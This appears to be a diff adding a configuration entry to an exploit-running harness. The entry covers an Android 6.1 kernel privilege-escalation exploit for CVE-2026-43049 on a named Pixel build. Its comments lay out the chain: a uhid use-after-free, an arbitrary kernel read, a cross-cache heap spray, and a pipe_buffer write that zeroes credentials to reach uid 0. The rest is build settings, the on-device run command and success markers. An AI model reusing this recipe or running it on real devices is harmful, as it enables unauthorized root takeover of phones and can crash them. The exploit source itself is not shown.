@@ -1,0 +1,124 @@
+# entry.ffwheel@6.1 — CVE-2026-43049 FFWheel, read-derived ROOT (writer crosscache).
+#
+# One binary (ffcompose) run as an unprivileged shell. It forks a child per half
+# (-DFFCOMPOSE): the reader (ffread_mm) turns mm->mm_mt.ma_root + /proc/self/maps
+# into a repeatable arbitrary read and resolves the writer's cred + pipe_inode_info;
+# the writer (ffroot_w) does the pipe_buffer cred-zero write -> uid 0. The WRITER
+# places its forge deterministically via the cross-cache (FFROOT_CROSSCACHE:
+# lib/spray/crosscache leaks a sprayed mm_struct to a KNOWN order-3 base and
+# reclaims it with the forge -- no physmap guess). The reader still uses the guess
+# (its repeated read needs a userspace-writable page the kernel-owned cross-cache
+# page can't provide). Probabilistic: a cross-cache/guess miss panics, so reboot
+# per shot; the goal is uid 0.
+
+schema = 1
+kind   = "entry"
+id     = "entry.ffwheel@6.1"
+cve    = "CVE-2026-43049"
+kmi    = ["android14-6.1"]
+
+targets = ["panther-CP2A.260705.006"]
+
+composed = false
+status   = "Root recipe (uid/gid 2000->0). Writer forge placed deterministically via cross-cache (known base); reader read still a guess. Both placements probabilistic (a miss panics), reboot-per-shot."
+
+[build]
+form    = "static-exe"
+entry   = "main"
+sources = ["cves/cve-2026-43049-ffwheel/ffcompose.c",
+           "cves/cve-2026-43049-ffwheel/ffread_mm.c",
+           "cves/cve-2026-43049-ffwheel/ffread_resolve.c",
+           "cves/cve-2026-43049-ffwheel/ffroot_w.c",
+           "cves/lib/spray/crosscache/crosscache.c",
+           "cves/lib/rw/pipe_rw.c",
+           "cves/lib/trigger/uhid.c",
+           "cves/lib/spray/physspray.c",
+           "cves/lib/spray/skbspray.c",
+           "cves/lib/root/kprobe_read.c",
+           "cves/lib/root/cred.c"]
+includes = ["cves"]             # resolves TARGET_HEADER
+depends  = ["cves/cve-2026-43049-ffwheel/ksnitch_mm.h",
+            "cves/cve-2026-43049-ffwheel/ffwheel_forge.h",
+            "cves/cve-2026-43049-ffwheel/ffread_resolve.h",
+            "cves/lib/spray/crosscache/crosscache.h",
+            "cves/lib/leak/kernelsnitch/kernelsnitch.h",
+            "cves/lib/root/kprobe_read.h",
+            "cves/lib/root/cred.h",
+            "cves/lib/rw/pipe_krw.h",
+            "cves/cve-2026-43049-ffwheel/ffcompose_ipc.h"]
+# KSNITCH_DETACHED_THREADS: writer runs KernelSnitch twice (own-mm leak +
+# crosscache) and the reader runs it too; detached small-stack leak threads keep
+# the instances from exhausting the address space.
+defines  = ["FFCOMPOSE", "KSNITCH_DETACHED_THREADS"]
+# -ffunction-sections/-fdata-sections + -Wl,--gc-sections: without them this
+# binary refuses to even exec on this device ("executable's TLS segment is
+# underaligned ... needs to be at least 64 for ARM64 Bionic") -- linking
+# crosscache.c pulls in KernelSnitch's pthread_create, which pulls in a
+# weakly-referenced GWP-ASan TLS symbol from bionic's static libc.a that
+# section GC drops (verified: PT_TLS vanishes entirely with these flags).
+# Found and fixed alongside entry.ffwheel-root@6.1, which hit the same
+# failure building the identical ffroot_w.c/crosscache.c.
+cflags   = ["-std=gnu17", "@OPT@", "-static", "-ffunction-sections", "-fdata-sections", "-Werror"]
+opt      = ["-O2", "-g0"]
+ldflags  = ["-Wl,--gc-sections"]
+output   = "cve-2026-43049-ffwheel"
+uses_target_header = true    # structure layouts and symbol offsets
+
+[properties]
+retry_safe  = true
+panic_risk  = { pre_slide = "high", post_slide = "high" }
+destructive = ["uhid UAF collateral (may panic InputReader)", "reader mm->mm_mt.ma_root overwritten (parks)", "cross-cache/guess miss -> panic"]
+restores    = []
+provides      = []
+requires_caps = []
+retains       = []
+
+[invoke]
+kind = "device-exec"
+artifact_source = "build"
+dest = "/data/local/tmp/cve43049-ffcompose"
+mode = "755"
+# FFROOT_CROSSCACHE: the writer places its forge via the cross-cache. Boot-stable
+# KASLR base replayed via @KASLR_ENV@ (accepts_base; ffcompose handles KASLR_LEAK_ONLY).
+command = "cd @DEV_TMP@; FFROOT_CROSSCACHE=1 @KASLR_ENV@@DEV_ENTRY@ > @DEV_LOG@ 2>&1"
+accepts_base = true
+needs_root = false
+
+[markers]
+pass = '(slide-kaslr-tracefs-ok pid=[0-9]+ base=[0-9a-f]+|FFROOT_W_ROOT uid=0)'
+gate_fail = 'FFROOT_W_NO_SUCH_GATE_FAIL'
+restore_pass = 'FFROOT_W_NO_SUCH_RESTORE_PASS'
+restore_bad  = 'FFROOT_W_NO_SUCH_RESTORE_BAD'
+heartbeat    = 'FFWHEEL_HEARTBEAT seq=[0-9]+'
+diag       = '(FFROOT_W_CROSS_LEAK_MISS|FFROOT_W_CROSS_DELIVER_MISS|FFROOT_W_MISS.*|no cred VA.*|no pipe_inode.*|FFREAD_MISS.*)'
+diag_count = ''
+# Terminal deadlock: a half died without the handoff its peer blocks on. The
+# runner kills the shot on this instead of waiting out the writer's ~4-min
+# WAITING_FOR_PI deadline (the reboot-per-shot loop clears what it leaves).
+stall      = 'STALL: .*will time out'
+
+[provides]
+caps  = []
+field = 'base=[0-9a-f]+'
+label = "base"
+
+# Reboot before every shot. This CVE's debris is permanent until reboot: each
+# shot leaks an input_dev + hid_device (a live /dev/input/eventN whose
+# hid->driver_data dangles) and PARKS a half holding a redirected pipe->bufs and
+# a multi-GB mlock'd spray that cannot be killed (freeing it panics). On one
+# boot that debris both drains MemAvailable -- so the spray budget, hence the
+# guess coverage (R_GUESS_APRIORI), death-spirals shot over shot (measured:
+# 3.5GB->2.0GB->0.35GB avail, 19%->2% coverage) -- and eventually panics on its
+# own when init/system_server closes a stale node ("comm:init
+# PC:__wake_up_common"). A fresh boot per shot restores full MemAvailable and
+# clears the debris, so every shot lands as clean as the boot it starts on.
+[[setup]]
+reboot = true
+description = "fresh boot per shot: full MemAvailable (guess coverage) + no uhid/parked-half debris"
+
+[[setup]]
+reboot = false
+command = "echo ffwheel-setup uptime=$(cut -d. -f1 /proc/uptime)s inputs=$(ls /dev/input | wc -l)"
+needs_root = false
+once_per_boot = false
+description = "record this boot's uptime and /dev/input node count"
